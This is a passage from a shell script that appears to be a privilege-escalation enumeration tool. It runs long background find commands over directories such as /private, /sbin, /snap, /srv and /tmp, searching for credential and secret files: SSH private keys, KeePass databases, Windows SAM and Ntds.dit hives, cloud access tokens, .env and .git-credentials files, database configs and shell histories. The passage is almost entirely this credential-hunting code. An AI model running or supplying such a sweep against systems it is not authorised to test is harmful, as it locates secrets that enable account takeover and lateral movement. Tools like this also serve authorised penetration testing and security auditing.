\".secrets.mkey\" -o -name \".profile\" -o -name \"docker.socket\" -o -name \"wsl.exe\" -o -name \"gvm-tools.conf\" -o -name \"KeePass.config*\" -o -name \"*password*\" -o -name \"kcpassword\" -o -name \"bash.exe\" -o -name \"crio.sock\" -o -name \"secrets.yml\" -o -name \"NetSetup.log\" -o -name \"*.ovpn\" -o -name \"snmpd.conf\" -o -name \"unattended.xml\" -o -name \"SAM\" -o -name \"*.timer\" -o -name \"system.sav\" -o -name \"database.php\" -o -name \"sentry.conf.py\" -o -name \"pg_hba.conf\" -o -name \"error.log\" -o -name \".lesshst\" -o -name \"*.csr\" -o -name \"index.dat\" -o -name \"sitemanager.xml\" -o -name \".gitconfig\" -o -name \".msmtprc\" -o -name \"vault-ssh-helper.hcl\" -o -name \"frakti.sock\" -o -name \"*.p12\" -o -name \"*.ftpconfig\" -o -name \"ftp.ini\" -o -name \"AppEvent.Evt\" -o -name \"setupinfo.bak\" -o -name \"containerd.sock\" -o -name \"rocketchat.service\" -o -name \".ldaprc\" -o -name \"*.socket\" -o -name \"Dockerfile\" -o -name \"httpd.conf\" -o -name \"wcx_ftp.ini\" -o -name \"accessTokens.json\" -o -name \"appcmd.exe\" -o -name \"KeePass.enforced*\" -o -name \"*.rdg\" -o -name \"unattend.inf\" -o -name \"credentials.db\" -o -name \"RDCMan.settings\" -o -name \"kadm5.acl\" -o -name \"printers.xml\" -o -name \".recently-used.xbel\" -o -name \"php.ini\" -o -name \"*.viminfo\" -o -name \"nginx.conf\" -o -name \"*.kdbx\" -o -name \"SecEvent.Evt\" -o -name \"*_history*\" -o -name \"*.keytab\" -o -name \"pwd.ibd\" -o -name \"hostapd.conf\" -o -name \"id_dsa*\" -o -name \"iis6.log\" -o -name \"passwd.ibd\" -o -name \"FreeSSHDservice.ini\" -o -name \"redis.conf\" -o -name \"*credential*\" -o -name \"anaconda-ks.cfg\" -o -name \"ftp.config\" -o -name \"SYSTEM\" -o -name \".htpasswd\" -o -name \"rsyncd.conf\" -o -name \"datasources.xml\" -o -name \"recentservers.xml\" -o -name \"known_hosts\" -o -name \".sudo_as_admin_successful\" -o -name \"*.gnupg\" -o -name \"Ntds.dit\" -o -name \"sites.ini\" -o -name \"https-xampp.conf\" -o -name \"unattend.xml\" -o -name \"pgsql.conf\" -o -name \"tomcat-users.xml\" -o -name \"config.php\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_PRIVATE=`eval_bckgrd "find /private -name \"storage.php\" -o -name \"ipsec.conf\" -o -name \".bashrc\" -o -name \".plan\" -o -name \"setupinfo\" -o -name \"*.sqlite\" -o -name \"jetty-realm.properties\" -o -name \"*.crt\" -o -name \"*.jks\" -o -name \"scclient.exe\" -o -name \"*.keystore\" -o -name \"software\" -o -name \".pypirc\" -o -name \"sssd.conf\" -o -name \"ffftp.ini\" -o -name \"*.cer\" -o -name \".vault-token\" -o -name \"id_rsa*\" -o -name \"backups\" -o -name \"autologin.conf\" -o -name \"filezilla.xml\" -o -name \"server.xml\" -o -name \".git-credentials\" -o -name \"glusterfs.ca\" -o -name \"zabbix_agentd.conf\" -o -name \"default.sav\" -o -name \"dockershim.sock\" -o -name \"ipsec.secrets\" -o -name \"postgresql.conf\" -o -name \"scheduledtasks.xml\" -o -name \"racoon.conf\" -o -name \"TokenCache.dat\" -o -name \"log4j-core*.jar\" -o -name \".erlang.cookie\" -o -name \"passwd\" -o -name \"protecteduserkey.bin\" -o -name \"cesi.conf\" -o -name \"mosquitto.conf\" -o -name \"*.pem\" -o -name \"AzureRMContext.json\" -o -name \"ntuser.dat\" -o -name \"*config*.php\" -o -name \"*.swp\" -o -name \"000-default.conf\" -o -name \"zabbix_server.conf\" -o -name \"supervisord.conf\" -o -name \"sysprep.inf\" -o -name \"ConsoleHost_history.txt\" -o -name \"kibana.y*ml\" -o -name \"*vnc*.ini\" -o -name \"access_tokens.json\" -o -name \".env\" -o -name \".k5login\" -o -name \"*.keyring\" -o -name \"*vnc*.xml\" -o -name \"*.pgp\" -o -name \".google_authenticator\" -o -name \"secrets.ldb\" -o -name \"backup\" -o -name \"authorized_hosts\" -o -name \"legacy_credentials.db\" -o -name \"ddclient.conf\" -o -name \"passbolt.php\" -o -name \"krb5.conf\" -o -name \"pgadmin*.db\" -o -name \"autologin\" -o -name \"unattend.txt\" -o -name \"*vnc*.txt\" -o -name \"debian.cnf\" -o -name \"fastcgi_params\" -o -name \"*.psk\" -o -name \"hosts.equiv\" -o -name \"influxdb.conf\" -o -name \"sysprep.xml\" -o -name \"settings.php\" -o -name \"azureProfile.json\" -o -name \"*.gpg\" -o -name \"glusterfs.pem\" -o -name \"web*.config\" -o -name \"glusterfs.key\" -o -name \"*.sqlite3\" -o -name \"rktlet.sock\" -o -name \"pagefile.sys\" -o -name \".wgetrc\" -o -name \"rsyncd.secrets\" -o -name \"wp-config.php\" -o -name \"cloud.cfg\" -o -name \"elasticsearch.y*ml\" -o -name \"security.sav\" -o -name \".git\" -o -name \"https.conf\" -o -name \"access_tokens.db\" -o -name \"*.db\" -o -name \"winscp.ini\" -o -name \"psk.txt\" -o -name \"software.sav\" -o -name \"my.cnf\" -o -name \"mongod*.conf\" -o -name \"creds*\" -o -name \"KeePass.ini\" -o -name \"*.service\" -o -name \"password*.ibd\" -o -name \"*.key\" -o -name \"drives.xml\" -o -name \"*.pfx\" -o -name \"mariadb.cnf\" -o -name \"my.ini\" -o -name \"db.php\" -o -name \"gitlab.yml\" -o -name \"*.der\" -o -name \"*vnc*.c*nf*\" -o -name \"docker-compose.yml\" -o -name \"docker.sock\" -o -name \"access.log\" -o -name \".rhosts\" -o -name \"gitlab.rm\" -o -name \"groups.xml\" -o -name \".github\" -o -name \"authorized_keys\" -o -name \"ws_ftp.ini\" -o -name \".secrets.mkey\" -o -name \".profile\" -o -name \"docker.socket\" -o -name \"wsl.exe\" -o -name \"gvm-tools.conf\" -o -name \"KeePass.config*\" -o -name \"*password*\" -o -name \"kcpassword\" -o -name \"bash.exe\" -o -name \"crio.sock\" -o -name \"secrets.yml\" -o -name \"NetSetup.log\" -o -name \"*.ovpn\" -o -name \"snmpd.conf\" -o -name \"unattended.xml\" -o -name \"SAM\" -o -name \"*.timer\" -o -name \"system.sav\" -o -name \"database.php\" -o -name \"sentry.conf.py\" -o -name \"pg_hba.conf\" -o -name \"error.log\" -o -name \".lesshst\" -o -name \"*.csr\" -o -name \"index.dat\" -o -name \"sitemanager.xml\" -o -name \".gitconfig\" -o -name \".msmtprc\" -o -name \"vault-ssh-helper.hcl\" -o -name \"frakti.sock\" -o -name \"*.p12\" -o -name \"*.ftpconfig\" -o -name \"ftp.ini\" -o -name \"AppEvent.Evt\" -o -name \"setupinfo.bak\" -o -name \"containerd.sock\" -o -name \"rocketchat.service\" -o -name \".ldaprc\" -o -name \"*.socket\" -o -name \"Dockerfile\" -o -name \"httpd.conf\" -o -name \"wcx_ftp.ini\" -o -name \"accessTokens.json\" -o -name \"appcmd.exe\" -o -name \"KeePass.enforced*\" -o -name \"*.rdg\" -o -name \"unattend.inf\" -o -name \"credentials.db\" -o -name \"RDCMan.settings\" -o -name \"kadm5.acl\" -o -name \"printers.xml\" -o -name \".recently-used.xbel\" -o -name \"php.ini\" -o -name \"*.viminfo\" -o -name \"nginx.conf\" -o -name \"*.kdbx\" -o -name \"SecEvent.Evt\" -o -name \"*_history*\" -o -name \"*.keytab\" -o -name \"pwd.ibd\" -o -name \"hostapd.conf\" -o -name \"id_dsa*\" -o -name \"iis6.log\" -o -name \"passwd.ibd\" -o -name \"FreeSSHDservice.ini\" -o -name \"redis.conf\" -o -name \"*credential*\" -o -name \"anaconda-ks.cfg\" -o -name \"ftp.config\" -o -name \"SYSTEM\" -o -name \".htpasswd\" -o -name \"sess_*\" -o -name \"rsyncd.conf\" -o -name \"datasources.xml\" -o -name \"recentservers.xml\" -o -name \"known_hosts\" -o -name \".sudo_as_admin_successful\" -o -name \"*.gnupg\" -o -name \"Ntds.dit\" -o -name \"sites.ini\" -o -name \"https-xampp.conf\" -o -name \"unattend.xml\" -o -name \"pgsql.conf\" -o -name \"tomcat-users.xml\" -o -name \"config.php\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_RUN=`eval_bckgrd "find /run -name \"*.timer\" -o -name \"*.service\" -o -name \"*.socket\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_SBIN=`eval_bckgrd "find /sbin -name \"storage.php\" -o -name \"ipsec.conf\" -o -name \".bashrc\" -o -name \".plan\" -o -name \"setupinfo\" -o -name \"*.sqlite\" -o -name \"jetty-realm.properties\" -o -name \"*.crt\" -o -name \"*.jks\" -o -name \"scclient.exe\" -o -name \"*.keystore\" -o -name \"software\" -o -name \".pypirc\" -o -name \"sssd.conf\" -o -name \"ffftp.ini\" -o -name \"*.cer\" -o -name \".vault-token\" -o -name \"id_rsa*\" -o -name \"backups\" -o -name \"autologin.conf\" -o -name \"filezilla.xml\" -o -name \"server.xml\" -o -name \".git-credentials\" -o -name \"glusterfs.ca\" -o -name \"zabbix_agentd.conf\" -o -name \"default.sav\" -o -name \"dockershim.sock\" -o -name \"ipsec.secrets\" -o -name \"postgresql.conf\" -o -name \"scheduledtasks.xml\" -o -name \"racoon.conf\" -o -name \"TokenCache.dat\" -o -name \"log4j-core*.jar\" -o -name \".erlang.cookie\" -o -name \"passwd\" -o -name \"protecteduserkey.bin\" -o -name \"cesi.conf\" -o -name \"mosquitto.conf\" -o -name \"*.pem\" -o -name \"AzureRMContext.json\" -o -name \"ntuser.dat\" -o -name \"*config*.php\" -o -name \"*.swp\" -o -name \"000-default.conf\" -o -name \"zabbix_server.conf\" -o -name \"supervisord.conf\" -o -name \"sysprep.inf\" -o -name \"ConsoleHost_history.txt\" -o -name \"kibana.y*ml\" -o -name \"*vnc*.ini\" -o -name \"access_tokens.json\" -o -name \".env\" -o -name \".k5login\" -o -name \"*.keyring\" -o -name \"*vnc*.xml\" -o -name \"*.pgp\" -o -name \".google_authenticator\" -o -name \"secrets.ldb\" -o -name \"backup\" -o -name \"authorized_hosts\" -o -name \"legacy_credentials.db\" -o -name \"ddclient.conf\" -o -name \"passbolt.php\" -o -name \"krb5.conf\" -o -name \"pgadmin*.db\" -o -name \"autologin\" -o -name \"unattend.txt\" -o -name \"*vnc*.txt\" -o -name \"debian.cnf\" -o -name \"fastcgi_params\" -o -name \"*.psk\" -o -name \"hosts.equiv\" -o -name \"influxdb.conf\" -o -name \"sysprep.xml\" -o -name \"settings.php\" -o -name \"azureProfile.json\" -o -name \"*.gpg\" -o -name \"glusterfs.pem\" -o -name \"web*.config\" -o -name \"glusterfs.key\" -o -name \"*.sqlite3\" -o -name \"rktlet.sock\" -o -name \"pagefile.sys\" -o -name \".wgetrc\" -o -name \"rsyncd.secrets\" -o -name \"wp-config.php\" -o -name \"cloud.cfg\" -o -name \"elasticsearch.y*ml\" -o -name \"security.sav\" -o -name \".git\" -o -name \"https.conf\" -o -name \"access_tokens.db\" -o -name \"*.db\" -o -name \"winscp.ini\" -o -name \"psk.txt\" -o -name \"software.sav\" -o -name \"my.cnf\" -o -name \"mongod*.conf\" -o -name \"creds*\" -o -name \"KeePass.ini\" -o -name \"*.service\" -o -name \"password*.ibd\" -o -name \"*.key\" -o -name \"drives.xml\" -o -name \"*.pfx\" -o -name \"mariadb.cnf\" -o -name \"my.ini\" -o -name \"db.php\" -o -name \"gitlab.yml\" -o -name \"*.der\" -o -name \"*vnc*.c*nf*\" -o -name \"docker-compose.yml\" -o -name \"docker.sock\" -o -name \"access.log\" -o -name \".rhosts\" -o -name \"gitlab.rm\" -o -name \"groups.xml\" -o -name \".github\" -o -name \"authorized_keys\" -o -name \"ws_ftp.ini\" -o -name \".secrets.mkey\" -o -name \".profile\" -o -name \"docker.socket\" -o -name \"wsl.exe\" -o -name \"gvm-tools.conf\" -o -name \"KeePass.config*\" -o -name \"*password*\" -o -name \"kcpassword\" -o -name \"bash.exe\" -o -name \"crio.sock\" -o -name \"secrets.yml\" -o -name \"NetSetup.log\" -o -name \"*.ovpn\" -o -name \"snmpd.conf\" -o -name \"unattended.xml\" -o -name \"SAM\" -o -name \"*.timer\" -o -name \"system.sav\" -o -name \"database.php\" -o -name \"sentry.conf.py\" -o -name \"pg_hba.conf\" -o -name \"error.log\" -o -name \".lesshst\" -o -name \"*.csr\" -o -name \"index.dat\" -o -name \"sitemanager.xml\" -o -name \".gitconfig\" -o -name \".msmtprc\" -o -name \"vault-ssh-helper.hcl\" -o -name \"frakti.sock\" -o -name \"*.p12\" -o -name \"*.ftpconfig\" -o -name \"ftp.ini\" -o -name \"AppEvent.Evt\" -o -name \"setupinfo.bak\" -o -name \"containerd.sock\" -o -name \"rocketchat.service\" -o -name \".ldaprc\" -o -name \"*.socket\" -o -name \"Dockerfile\" -o -name \"httpd.conf\" -o -name \"wcx_ftp.ini\" -o -name \"accessTokens.json\" -o -name \"appcmd.exe\" -o -name \"KeePass.enforced*\" -o -name \"*.rdg\" -o -name \"unattend.inf\" -o -name \"credentials.db\" -o -name \"RDCMan.settings\" -o -name \"kadm5.acl\" -o -name \"printers.xml\" -o -name \".recently-used.xbel\" -o -name \"php.ini\" -o -name \"*.viminfo\" -o -name \"nginx.conf\" -o -name \"*.kdbx\" -o -name \"SecEvent.Evt\" -o -name \"*_history*\" -o -name \"*.keytab\" -o -name \"pwd.ibd\" -o -name \"hostapd.conf\" -o -name \"id_dsa*\" -o -name \"iis6.log\" -o -name \"passwd.ibd\" -o -name \"FreeSSHDservice.ini\" -o -name \"redis.conf\" -o -name \"*credential*\" -o -name \"anaconda-ks.cfg\" -o -name \"ftp.config\" -o -name \"SYSTEM\" -o -name \".htpasswd\" -o -name \"rsyncd.conf\" -o -name \"datasources.xml\" -o -name \"recentservers.xml\" -o -name \"known_hosts\" -o -name \".sudo_as_admin_successful\" -o -name \"*.gnupg\" -o -name \"Ntds.dit\" -o -name \"sites.ini\" -o -name \"https-xampp.conf\" -o -name \"unattend.xml\" -o -name \"pgsql.conf\" -o -name \"tomcat-users.xml\" -o -name \"config.php\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_SNAP=`eval_bckgrd "find /snap -name \"storage.php\" -o -name \"ipsec.conf\" -o -name \".bashrc\" -o -name \".plan\" -o -name \"setupinfo\" -o -name \"*.sqlite\" -o -name \"jetty-realm.properties\" -o -name \"*.crt\" -o -name \"*.jks\" -o -name \"scclient.exe\" -o -name \"*.keystore\" -o -name \"software\" -o -name \".pypirc\" -o -name \"sssd.conf\" -o -name \"ffftp.ini\" -o -name \"*.cer\" -o -name \".vault-token\" -o -name \"id_rsa*\" -o -name \"backups\" -o -name \"autologin.conf\" -o -name \"filezilla.xml\" -o -name \"server.xml\" -o -name \".git-credentials\" -o -name \"glusterfs.ca\" -o -name \"zabbix_agentd.conf\" -o -name \"default.sav\" -o -name \"dockershim.sock\" -o -name \"ipsec.secrets\" -o -name \"postgresql.conf\" -o -name \"scheduledtasks.xml\" -o -name \"racoon.conf\" -o -name \"TokenCache.dat\" -o -name \"log4j-core*.jar\" -o -name \".erlang.cookie\" -o -name \"passwd\" -o -name \"protecteduserkey.bin\" -o -name \"cesi.conf\" -o -name \"mosquitto.conf\" -o -name \"*.pem\" -o -name \"AzureRMContext.json\" -o -name \"ntuser.dat\" -o -name \"*config*.php\" -o -name \"*.swp\" -o -name \"000-default.conf\" -o -name \"zabbix_server.conf\" -o -name \"supervisord.conf\" -o -name \"sysprep.inf\" -o -name \"ConsoleHost_history.txt\" -o -name \"kibana.y*ml\" -o -name \"*vnc*.ini\" -o -name \"access_tokens.json\" -o -name \".env\" -o -name \".k5login\" -o -name \"*.keyring\" -o -name \"*vnc*.xml\" -o -name \"*.pgp\" -o -name \".google_authenticator\" -o -name \"secrets.ldb\" -o -name \"backup\" -o -name \"authorized_hosts\" -o -name \"legacy_credentials.db\" -o -name \"ddclient.conf\" -o -name \"passbolt.php\" -o -name \"krb5.conf\" -o -name \"pgadmin*.db\" -o -name \"autologin\" -o -name \"unattend.txt\" -o -name \"*vnc*.txt\" -o -name \"debian.cnf\" -o -name \"fastcgi_params\" -o -name \"*.psk\" -o -name \"hosts.equiv\" -o -name \"influxdb.conf\" -o -name \"sysprep.xml\" -o -name \"settings.php\" -o -name \"azureProfile.json\" -o -name \"*.gpg\" -o -name \"glusterfs.pem\" -o -name \"web*.config\" -o -name \"glusterfs.key\" -o -name \"*.sqlite3\" -o -name \"rktlet.sock\" -o -name \"pagefile.sys\" -o -name \".wgetrc\" -o -name \"rsyncd.secrets\" -o -name \"wp-config.php\" -o -name \"cloud.cfg\" -o -name \"elasticsearch.y*ml\" -o -name \"security.sav\" -o -name \".git\" -o -name \"https.conf\" -o -name \"access_tokens.db\" -o -name \"*.db\" -o -name \"winscp.ini\" -o -name \"psk.txt\" -o -name \"software.sav\" -o -name \"my.cnf\" -o -name \"mongod*.conf\" -o -name \"creds*\" -o -name \"KeePass.ini\" -o -name \"*.service\" -o -name \"password*.ibd\" -o -name \"*.key\" -o -name \"drives.xml\" -o -name \"*.pfx\" -o -name \"mariadb.cnf\" -o -name \"my.ini\" -o -name \"db.php\" -o -name \"gitlab.yml\" -o -name \"*.der\" -o -name \"*vnc*.c*nf*\" -o -name \"docker-compose.yml\" -o -name \"docker.sock\" -o -name \"access.log\" -o -name \".rhosts\" -o -name \"gitlab.rm\" -o -name \"groups.xml\" -o -name \".github\" -o -name \"authorized_keys\" -o -name \"ws_ftp.ini\" -o -name \".secrets.mkey\" -o -name \".profile\" -o -name \"docker.socket\" -o -name \"wsl.exe\" -o -name \"gvm-tools.conf\" -o -name \"KeePass.config*\" -o -name \"*password*\" -o -name \"kcpassword\" -o -name \"bash.exe\" -o -name \"crio.sock\" -o -name \"secrets.yml\" -o -name \"NetSetup.log\" -o -name \"*.ovpn\" -o -name \"snmpd.conf\" -o -name \"unattended.xml\" -o -name \"SAM\" -o -name \"*.timer\" -o -name \"system.sav\" -o -name \"database.php\" -o -name \"sentry.conf.py\" -o -name \"pg_hba.conf\" -o -name \"error.log\" -o -name \".lesshst\" -o -name \"*.csr\" -o -name \"index.dat\" -o -name \"sitemanager.xml\" -o -name \".gitconfig\" -o -name \".msmtprc\" -o -name \"vault-ssh-helper.hcl\" -o -name \"frakti.sock\" -o -name \"*.p12\" -o -name \"*.ftpconfig\" -o -name \"ftp.ini\" -o -name \"AppEvent.Evt\" -o -name \"setupinfo.bak\" -o -name \"containerd.sock\" -o -name \"rocketchat.service\" -o -name \".ldaprc\" -o -name \"*.socket\" -o -name \"Dockerfile\" -o -name \"httpd.conf\" -o -name \"wcx_ftp.ini\" -o -name \"accessTokens.json\" -o -name \"appcmd.exe\" -o -name \"KeePass.enforced*\" -o -name \"*.rdg\" -o -name \"unattend.inf\" -o -name \"credentials.db\" -o -name \"RDCMan.settings\" -o -name \"kadm5.acl\" -o -name \"printers.xml\" -o -name \".recently-used.xbel\" -o -name \"php.ini\" -o -name \"*.viminfo\" -o -name \"nginx.conf\" -o -name \"*.kdbx\" -o -name \"SecEvent.Evt\" -o -name \"*_history*\" -o -name \"*.keytab\" -o -name \"pwd.ibd\" -o -name \"hostapd.conf\" -o -name \"id_dsa*\" -o -name \"iis6.log\" -o -name \"passwd.ibd\" -o -name \"FreeSSHDservice.ini\" -o -name \"redis.conf\" -o -name \"*credential*\" -o -name \"anaconda-ks.cfg\" -o -name \"ftp.config\" -o -name \"SYSTEM\" -o -name \".htpasswd\" -o -name \"rsyncd.conf\" -o -name \"datasources.xml\" -o -name \"recentservers.xml\" -o -name \"known_hosts\" -o -name \".sudo_as_admin_successful\" -o -name \"*.gnupg\" -o -name \"Ntds.dit\" -o -name \"sites.ini\" -o -name \"https-xampp.conf\" -o -name \"unattend.xml\" -o -name \"pgsql.conf\" -o -name \"tomcat-users.xml\" -o -name \"config.php\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_SRV=`eval_bckgrd "find /srv -name \"storage.php\" -o -name \"ipsec.conf\" -o -name \".bashrc\" -o -name \".plan\" -o -name \"setupinfo\" -o -name \"*.sqlite\" -o -name \"jetty-realm.properties\" -o -name \"*.crt\" -o -name \"*.jks\" -o -name \"scclient.exe\" -o -name \"*.keystore\" -o -name \"software\" -o -name \".pypirc\" -o -name \"sssd.conf\" -o -name \"ffftp.ini\" -o -name \"*.cer\" -o -name \".vault-token\" -o -name \"id_rsa*\" -o -name \"backups\" -o -name \"autologin.conf\" -o -name \"filezilla.xml\" -o -name \"server.xml\" -o -name \".git-credentials\" -o -name \"glusterfs.ca\" -o -name \"zabbix_agentd.conf\" -o -name \"default.sav\" -o -name \"dockershim.sock\" -o -name \"ipsec.secrets\" -o -name \"postgresql.conf\" -o -name \"scheduledtasks.xml\" -o -name \"racoon.conf\" -o -name \"TokenCache.dat\" -o -name \"log4j-core*.jar\" -o -name \".erlang.cookie\" -o -name \"passwd\" -o -name \"protecteduserkey.bin\" -o -name \"cesi.conf\" -o -name \"mosquitto.conf\" -o -name \"*.pem\" -o -name \"AzureRMContext.json\" -o -name \"ntuser.dat\" -o -name \"*config*.php\" -o -name \"*.swp\" -o -name \"000-default.conf\" -o -name \"zabbix_server.conf\" -o -name \"supervisord.conf\" -o -name \"sysprep.inf\" -o -name \"ConsoleHost_history.txt\" -o -name \"kibana.y*ml\" -o -name \"*vnc*.ini\" -o -name \"access_tokens.json\" -o -name \".env\" -o -name \".k5login\" -o -name \"*.keyring\" -o -name \"*vnc*.xml\" -o -name \"*.pgp\" -o -name \".google_authenticator\" -o -name \"secrets.ldb\" -o -name \"backup\" -o -name \"authorized_hosts\" -o -name \"legacy_credentials.db\" -o -name \"ddclient.conf\" -o -name \"passbolt.php\" -o -name \"krb5.conf\" -o -name \"pgadmin*.db\" -o -name \"autologin\" -o -name \"unattend.txt\" -o -name \"*vnc*.txt\" -o -name \"debian.cnf\" -o -name \"fastcgi_params\" -o -name \"*.psk\" -o -name \"hosts.equiv\" -o -name \"influxdb.conf\" -o -name \"sysprep.xml\" -o -name \"settings.php\" -o -name \"azureProfile.json\" -o -name \"*.gpg\" -o -name \"glusterfs.pem\" -o -name \"web*.config\" -o -name \"glusterfs.key\" -o -name \"*.sqlite3\" -o -name \"rktlet.sock\" -o -name \"pagefile.sys\" -o -name \".wgetrc\" -o -name \"rsyncd.secrets\" -o -name \"wp-config.php\" -o -name \"cloud.cfg\" -o -name \"elasticsearch.y*ml\" -o -name \"security.sav\" -o -name \".git\" -o -name \"https.conf\" -o -name \"access_tokens.db\" -o -name \"*.db\" -o -name \"winscp.ini\" -o -name \"psk.txt\" -o -name \"software.sav\" -o -name \"my.cnf\" -o -name \"mongod*.conf\" -o -name \"creds*\" -o -name \"KeePass.ini\" -o -name \"*.service\" -o -name \"password*.ibd\" -o -name \"*.key\" -o -name \"drives.xml\" -o -name \"*.pfx\" -o -name \"mariadb.cnf\" -o -name \"my.ini\" -o -name \"db.php\" -o -name \"gitlab.yml\" -o -name \"*.der\" -o -name \"*vnc*.c*nf*\" -o -name \"docker-compose.yml\" -o -name \"docker.sock\" -o -name \"access.log\" -o -name \".rhosts\" -o -name \"gitlab.rm\" -o -name \"groups.xml\" -o -name \".github\" -o -name \"authorized_keys\" -o -name \"ws_ftp.ini\" -o -name \".secrets.mkey\" -o -name \".profile\" -o -name \"docker.socket\" -o -name \"wsl.exe\" -o -name \"gvm-tools.conf\" -o -name \"KeePass.config*\" -o -name \"*password*\" -o -name \"kcpassword\" -o -name \"bash.exe\" -o -name \"crio.sock\" -o -name \"secrets.yml\" -o -name \"NetSetup.log\" -o -name \"*.ovpn\" -o -name \"snmpd.conf\" -o -name \"unattended.xml\" -o -name \"SAM\" -o -name \"*.timer\" -o -name \"system.sav\" -o -name \"database.php\" -o -name \"sentry.conf.py\" -o -name \"pg_hba.conf\" -o -name \"error.log\" -o -name \".lesshst\" -o -name \"*.csr\" -o -name \"index.dat\" -o -name \"sitemanager.xml\" -o -name \".gitconfig\" -o -name \".msmtprc\" -o -name \"vault-ssh-helper.hcl\" -o -name \"frakti.sock\" -o -name \"*.p12\" -o -name \"*.ftpconfig\" -o -name \"ftp.ini\" -o -name \"AppEvent.Evt\" -o -name \"setupinfo.bak\" -o -name \"containerd.sock\" -o -name \"rocketchat.service\" -o -name \".ldaprc\" -o -name \"*.socket\" -o -name \"Dockerfile\" -o -name \"httpd.conf\" -o -name \"wcx_ftp.ini\" -o -name \"accessTokens.json\" -o -name \"appcmd.exe\" -o -name \"KeePass.enforced*\" -o -name \"*.rdg\" -o -name \"unattend.inf\" -o -name \"credentials.db\" -o -name \"RDCMan.settings\" -o -name \"kadm5.acl\" -o -name \"printers.xml\" -o -name \".recently-used.xbel\" -o -name \"php.ini\" -o -name \"*.viminfo\" -o -name \"nginx.conf\" -o -name \"*.kdbx\" -o -name \"SecEvent.Evt\" -o -name \"*_history*\" -o -name \"*.keytab\" -o -name \"pwd.ibd\" -o -name \"hostapd.conf\" -o -name \"id_dsa*\" -o -name \"iis6.log\" -o -name \"passwd.ibd\" -o -name \"FreeSSHDservice.ini\" -o -name \"redis.conf\" -o -name \"*credential*\" -o -name \"anaconda-ks.cfg\" -o -name \"ftp.config\" -o -name \"SYSTEM\" -o -name \".htpasswd\" -o -name \"rsyncd.conf\" -o -name \"datasources.xml\" -o -name \"recentservers.xml\" -o -name \"known_hosts\" -o -name \".sudo_as_admin_successful\" -o -name \"*.gnupg\" -o -name \"Ntds.dit\" -o -name \"sites.ini\" -o -name \"https-xampp.conf\" -o -name \"unattend.xml\" -o -name \"pgsql.conf\" -o -name \"tomcat-users.xml\" -o -name \"config.php\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_SYS=`eval_bckgrd "find /sys -name \"*.timer\" -o -name \"*.service\" -o -name \"*.socket\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_SYSTEM=`eval_bckgrd "find /system -name \"*.timer\" -o -name \"*.service\" -o -name \"*.socket\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_SYSTEMD=`eval_bckgrd "find /systemd -name \"*.timer\" -o -name \"*.service\" -o -name \"*.socket\" -o -name \"rocketchat.service\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_TMP=`eval_bckgrd "find /tmp -name \"storage.php\" -o -name \"ipsec.conf\" -o -name \".bashrc\" -o -name \".plan\" -o -name \"setupinfo\" -o -name \"*.sqlite\" -o -name \"jetty-realm.properties\" -o -name \"*.crt\" -o -name \"*.jks\" -o -name \"scclient.exe\" -o -name \"*.keystore\" -o -name \"software\" -o -name \".pypirc\" -o -name \"sssd.conf\" -o -name \"ffftp.ini\" -o -name \"*.cer\" -o -name \".vault-token\" -o -name \"id_rsa*\" -o -name \"backups\" -o -name \"autologin.conf\" -o -name \"filezilla.xml\" -o -name \"server.xml\" -o -name \".git-credentials\" -o -name \"glusterfs.ca\" -o -name \"zabbix_agentd.conf\" -o -name \"default.sav\" -o -name \"dockershim.sock\" -o -name \"ipsec.secrets\" -o -name \"postgresql.conf\" -o -name \"scheduledtasks.xml\" -o -name \"racoon.conf\" -o -name \"TokenCache.dat\" -o -name \"log4j-core*.jar\" -o -name \".erlang.cookie\" -o -name \"passwd\" -o -name \"protecteduserkey.bin\" -o -name \"cesi.conf\" -o -name \"mosquitto.conf\" -o -name \"*.pem\" -o -name \"AzureRMContext.json\" -o -name \"ntuser.dat\" -o -name \"*config*.php\" -o -name \"*.swp\" -o -name \"000-default.conf\" -o -name \"zabbix_server.conf\" -o -name \"supervisord.conf\" -o -name \"sysprep.inf\" -o -name \"ConsoleHost_history.txt\" -o -name \"kibana.y*ml\" -o -name \"*vnc*.ini\" -o -name \"access_tokens.json\" -o -name \".env\" -o -name \".k5login\" -o -name \"*.keyring\" -o -name \"*vnc*.xml\" -o -name \"*.pgp\" -o -name \".google_authenticator\" -o -name \"secrets.ldb\" -o -name \"backup\" -o -name \"authorized_hosts\" -o -name \"legacy_credentials.db\" -o -name \"ddclient.conf\" -o -name \"passbolt.php\" -o -name \"krb5.conf\" -o -name \"pgadmin*.db\" -o -name \"autologin\" -o -name \"unattend.txt\" -o -name \"*vnc*.txt\" -o -name \"debian.cnf\" -o -name \"fastcgi_params\" -o -name \"*.psk\" -o -name \"hosts.equiv\" -o -name \"influxdb.conf\" -o -name \"sysprep.xml\" -o -name \"settings.php\" -o -name \"azureProfile.json\" -o -name \"*.gpg\" -o -name \"glusterfs.pem\" -o -name \"web*.config\" -o -name \"glusterfs.key\" -o -name \"*.sqlite3\" -o -name \"rktlet.sock\" -o -name \"pagefile.sys\" -o -name \".wgetrc\" -o -name \"rsyncd.secrets\" -o -name \"wp-config.php\" -o -name \"cloud.cfg\" -o -name \"elasticsearch.y*ml\" -o -name \"security.sav\" -o -name \".git\" -o -name \"https.conf\" -o -name \"access_tokens.db\" -o -name \"*.db\" -o -name \"winscp.ini\" -o -name \"psk.txt\" -o -name \"software.sav\" -o -name \"my.cnf\" -o -name \"mongod*.conf\" -o -name \"creds*\" -o -name \"KeePass.ini\" -o -name \"*.service\" -o -name \"password*.ibd\" -o -name \"*.key\" -o -name \"drives.xml\" -o -name \"*.pfx\" -o -name \"mariadb.cnf\" -o -name \"my.ini\" -o -name \"db.php\" -o -name \"gitlab.yml\" -o -name \"*.der\" -o -name \"*vnc*.c*nf*\" -o -name \"docker-compose.yml\" -o -name \"docker.sock\" -o -name \"access.log\" -o -name \".rhosts\" -o -name \"gitlab.rm\" -o -name 